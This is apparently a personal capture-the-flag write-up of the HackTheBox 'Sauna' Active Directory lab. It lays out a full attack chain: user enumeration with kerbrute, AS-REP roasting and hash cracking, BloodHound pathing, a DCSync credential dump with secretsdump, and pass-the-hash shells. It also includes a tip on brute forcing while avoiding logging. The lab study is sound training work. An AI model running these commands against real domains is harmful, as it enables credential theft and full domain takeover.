# Reconnaissance
- Add domain names to /etc/hosts (didn't state in notes but important)
## Nmap Enumeration
- We pass the commands:
```bash
nmap -sV -sC -vv 10.10.10.175
nmap -sU --top-ports=10 -vv 10.10.10.175


---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-20 18:31:55Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/20%Time=6804DB38%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-20T18:32:16
|_  start_date: N/A
|_clock-skew: 7h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35558/tcp): CLEAN (Timeout)
|   Check 2 (port 39974/tcp): CLEAN (Timeout)
|   Check 3 (port 57297/udp): CLEAN (Timeout)
|   Check 4 (port 52168/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127
```
- HTTP, kerberos, smb, rpc, ldap
- Domain : EGOTISTICAL-BANK.LOCAL
## Directory Enumeration
- Gobuster:
- Directory
```bash
gobuster dir -u http://10.10.10.175 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root

---OUTPUT---
/images               (Status: 301) [Size: 150] [--> http://10.10.10.175/images/]
/Images               (Status: 301) [Size: 150] [--> http://10.10.10.175/Images/]
/css                  (Status: 301) [Size: 147] [--> http://10.10.10.175/css/]
/fonts                (Status: 301) [Size: 149] [--> http://10.10.10.175/fonts/]
/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.10.175/IMAGES/]
/Fonts                (Status: 301) [Size: 149] [--> http://10.10.10.175/Fonts/]
/CSS                  (Status: 301) [Size: 147] [--> http://10.10.10.175/CSS/]
```
- with html tag
```bash
gobuster dir -u http://10.10.10.175 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root -x html

---OUTPUT---
/index.html           (Status: 200) [Size: 32797]
/images               (Status: 301) [Size: 150] [--> http://10.10.10.175/images/]
/contact.html         (Status: 200) [Size: 15634]
/about.html           (Status: 200) [Size: 30954]
/blog.html            (Status: 200) [Size: 24695]
/Images               (Status: 301) [Size: 150] [--> http://10.10.10.175/Images/]
/css                  (Status: 301) [Size: 147] [--> http://10.10.10.175/css/]
/Contact.html         (Status: 200) [Size: 15634]
/About.html           (Status: 200) [Size: 30954]
/Index.html           (Status: 200) [Size: 32797]
/Blog.html            (Status: 200) [Size: 24695]
/fonts                (Status: 301) [Size: 149] [--> http://10.10.10.175/fonts/]
/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.10.175/IMAGES/]
/INDEX.html           (Status: 200) [Size: 32797]
/Fonts                (Status: 301) [Size: 149] [--> http://10.10.10.175/Fonts/]
/single.html          (Status: 200) [Size: 38059]
/CSS                  (Status: 301) [Size: 147] [--> http://10.10.10.175/CSS/]
/CONTACT.html         (Status: 200) [Size: 15634]
```
- VHost
```bash

```
- Ffuf
```bash

```
- Dirsearch
```bash

```
- Dirbuster
- 

## Website Enumeration
- 
### Direct
- 

### Via BurpSuite
- 

--------------
## Initial Foothold in Website
- We copy the usernames from the website into a username file:
```bash
vi users # Copy here
cat users

---OUTPUT---
ferus
fergussmith
shaun
shauncoins
hugo
hugobears
bowie
bowietaylor
steven
stevenkerb
sophie
sophiedriver
FSmith
HBear
SKerb
SCoins
BTaylor
SDriver
F.Smith
H.Bear
S.Kerb
S.Coins
B.Taylor
S.Driver
```
- We brute force using kerbrute to find valid
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /home/kali/Downloads/Windows/ActiveDirectory/Sauna/users

---OUTPUT---

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/21/25 - Ronnie Flathers @ropnop

2025/04/21 07:39:39 >  Using KDC(s):
2025/04/21 07:39:39 >   10.10.10.175:88

2025/04/21 07:39:39 >  [+] FSmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$FSmith@EGOTISTICAL-BANK.LOCAL:fa14af4be4b52eacf3b18373c0e078a1$02929b31719c4ac21108f2e69b323218c47d8844baaf810644db5b75ad88b6d6edce02b8329d0604725d52fae837fd7ffe41c0cbd6645d9d3e28dd77efeac987cd192be737b266d9d11a84b57e8dd83f440a6deab70b7b9ff6ede594fcf8bad67e6a551476131c9fc090acd2a0809748cc26800e3b6309b60e5ceeb5ba58ebd3503d649edd628cb5638ddc3a505a4c2844d346316303c3bfce79d2ed21f6b01ba639c8a198d894812e6f52a9f187eb93e21dafdf5ca13a6854cc936ee25b54383f18fbe9b9159f77578b05b61ec66b09409b345dc6602df1d48e84a3bf9a68fe6a5fda8778105699d688a34f25bd7746c4ab7222a5f0618dcd170fd94e543606b7f719df507f901ffbf5542286c4fb54e850dbc9577b                                                                                        
2025/04/21 07:39:39 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
2025/04/21 07:39:39 >  Done! Tested 30 usernames (1 valid) in 0.090 seconds
```
- We try to crack this hash but fails
- This happened in one of our earlier labs too
- We look for users with no kerberos pre-auth token (specifically fsmith's) (ASREPRoast)
```bash
impacket-GetNPUsers -usersfile users -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.10.175 'egotistical-bank.local/'

---OUTPUT---
...
...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:3ea6ec143b0f76fbe0a8367f03d25d91$f2157d498345950babfcb30d96b8598604939d9271e363df16a3df3662003498478c51b4601caec26dc5bdec4d98da6467f770f4f3ac6f7d434da7eb3df3df0f437111f5d881248f455efdb8e87b6a26955d7be848d32ef41bd4fb5ca052bd07f81a216c3972b5cae5b406ab98819bd53f65cca728887d1bb0c5adee904186ee895c42d36edebce884da4e21b35906ee9998d0c6d43900a7af8bfabbc1e5f84d5fc232af54c702a7de82b803af15e0bd7b91dffb8a8af7fb6afeb036a5ba1d7eb049488a8f10bd740fca7c6c74df366f95a3a68c466a69c5f259686bba7a5df2f3cf8bdf10d5a35d1a90f3a0bf6eb9cbc1be08005e1c9aa344435106c471bec4
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
...
```
- We attempt to crack this hash with john:
```bash
john fsmith.hash2 --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
Thestrokes23     ($krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL) 
```
- We can now login with credentials for user flag
## BloodHound Enumeration
- We then use these credentials to grab files from target to analyze with bloodhound:
```bash
bloodhound-python --dns-tcp -ns 10.10.10.175 -d egotistical-bank.local -u 'fsmith' -p 'Thestrokes23' -c all
```
- We mark fsmith as owned
- Shortest path to Domain Admins
- ![[Pasted image 20250421092142.png]]
- We mark svc_loanmgr as high value target (and administrator)

------------
## Privilege Escalation in Website
- We find winPEASany.exe in Desktop and execute it and find something interesting:
```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```
- We check using crackmapexec if the credentials work but it fails. 
- From BloodHound we know a high value target called `svc_loanmgr` and we use that with our credentials to check:
```bash
crackmapexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'

---OUTPUT---
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakesth
```
- We get a hit.
- We mark `svc_loanmgr` as owned in BloodHound
- Shortest Path from Owned Principles to Domain Admin
- ![[Pasted image 20250421093953.png]]
- We see `svc_loanmgr` has DCSync privileges over our domain
- We can use this to grab the Administrator hash and perform Pass the Hash attack
- Outbound Object Control > First Degree Object Control:
- ![[Pasted image 20250421094302.png]]
- We see `svc_loanmgr` has multiple privileges over the domain:
- DCSync
- GetChanges
- GetChangesAll
- For DCSync to work we require the GetChanges and GetChangesAll privileges
- We perform DCSync attack using secretsdump:
```bash
impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'EGOTISTICAL-BANK.LOCAL'

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:ff2a2fe38b16e19e981d4d2dfd69c9df:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:eddbe030e508c0e98d44e12b8330537cc87e978f178738ec46b2817420944222
SAUNA$:aes128-cts-hmac-sha1-96:b14430f6a6d0442fdbacfdad733426da
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up... 
```

- Using the hash of Administrator we login to target:
- psexed:
```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file fHsNXJTo.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service ADts on 10.10.10.175.....
[*] Starting service ADts.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
- winrm:
```bash
evil-winrm -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.10.10.175

---OUTPUT---
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
```
- We grab the root flag.
-------
--------
## Extras
- Mostly from Ippsec:
## Vim Magic Macros from userlist
- Copy the users from website into file:
```bash
vi magicusers
cat magicusers

---OUTPUT---
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```
- in vi, press `qa` to start recording macro (start macro on `a`)
- Copy first line by moving pointer there and pressing `YY`
- Press `3P` to paste the line we copied 3 times as we will make 3 changes to each user
- Move down to the second line
- Press `Home` so cursor is always at the beginning of line
- Press `/ ` + `Enter` ( Note there is a space after /)
- Press `r` for replace and press `.` to replace the space with .
- Movie down one line
- Press `Home` to move to the start
- Move left one character and press `dw` to delete rest of the first word (includes space)
- Move down one character and repeat the above but this time we press `i` to insert after and add a `.` (basically seperating first character and last name with a .)
- Move down one line 
- Press `Home` to move to the beginning of line
- Press `q` to exit the recording
- Then on the next name press `@a` to replicate what we did.
- We press it each time for each name
- In the end the file should look like this:
```bash
cat magicusers

---OUTPUT---
Fergus Smith
Fergus.Smith
FSmith
F.Smith
Hugo Bear
Hugo.Bear
HBear
H.Bear
Steven Kerb
Steven.Kerb
SKerb
S.Kerb
Shaun Coins
Shaun.Coins
SCoins
S.Coins
Bowie Taylor
Bowie.Taylor
BTaylor
B.Taylor
Sophie Driver
Sophie.Driver
SDriver
S.Driver
```
- We can then use this file to kerbrute for users.
### Kerbrute
- It won't create event code 4624, instead it creates a kerberos failure which by default isn't logged
- Good way to brute force with potentially not being seen
- But you can lock accounts out so its still dangerous if brute forcing with password without checking
- Check password policy. If threshold is 0 there is no policy set and we are safe to brute force with passwords
### GetNPUsers
- Can pas a simpler command to just check one user:
```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith
> (No pwd)

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Cannot authenticate fsmith, getting its TGT
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:66f9199898cc68c56c1366534ca67450$d530510a3d1adf8cceae3a0261732b934f4a963bed5e2cfe630eafe17b94296b821c87968a8b5c005d0ce51c2eab8fbe3b9dcec9a79e252df401d4adc4d2112f05097318572f1ef66d7c46b2aeba4393985b516b09078d03256aab535f68b89e15c269db13ad93d1ca99ddee481891563111b851cae433754c8fdec0e4741df2d8e7fc7a7cdf4d5debdbb4a53aa8a6ccfbacd3d729ea906e7c0d79a9574522c81b0dde2c6f714475741f8525ef18eba60412e3b238fd056801786dc0d1dfbd62b5cf87688d06ce89fc91f2a208fd3b9762c531c86cf67de44fc14bd514c7ba1811b69ad4cc0a942ab2eea213f7da098085f9fe27364dbea86c4d1eeda9a6b182
```
### Cracking ASREP Hash with hashcat
- Hashcat command:
```bash
hashcat -m 18200 fsmith.hash2 /usr/share/wordlists/rockyou.txt

---OUTPUT---
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:3ea6ec143b0f76fbe0a8367f03d25d91$f2157d498345950babfcb30d96b8598604939d9271e363df16a3df3662003498478c51b4601caec26dc5bdec4d98da6467f770f4f3ac6f7d434da7eb3df3df0f437111f5d881248f455efdb8e87b6a26955d7be848d32ef41bd4fb5ca052bd07f81a216c3972b5cae5b406ab98819bd53f65cca728887d1bb0c5adee904186ee895c42d36edebce884da4e21b35906ee9998d0c6d43900a7af8bfabbc1e5f84d5fc232af54c702a7de82b803af15e0bd7b91dffb8a8af7fb6afeb036a5ba1d7eb049488a8f10bd740fca7c6c74df366f95a3a68c466a69c5f259686bba7a5df2f3cf8bdf10d5a35d1a90f3a0bf6eb9cbc1be08005e1c9aa344435106c471bec4:Thestrokes23
```
### Rabbit Holes
- If we search smb then we end up finding 2 shares:
- RICOH Aficio SP 8300DN PCL 6
- printer$
- If we searchsploit it we find a Local Priv Esc and we find a PoC here
- https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/
- Talks about files in ProgramData but those file don't exist for us
### Finding svc_loanmanager's real username
- On our target once we have logged in with fsmith's credentials we can first try to check for `svc_loanmanager` like this:
```bash
net user
--OR--
net users

---OUTPUT---
User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```
- For more information can do :
```bash
net user /domain svc_loanmgr # can try other users

---OUTPUT---
User name                    svc_loanmgr
Full Name                    L Manager
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/24/2020 4:48:31 PM
Password expires             Never
Password changeable          1/25/2020 4:48:31 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
- All user group membership is Domain users so can't do anythin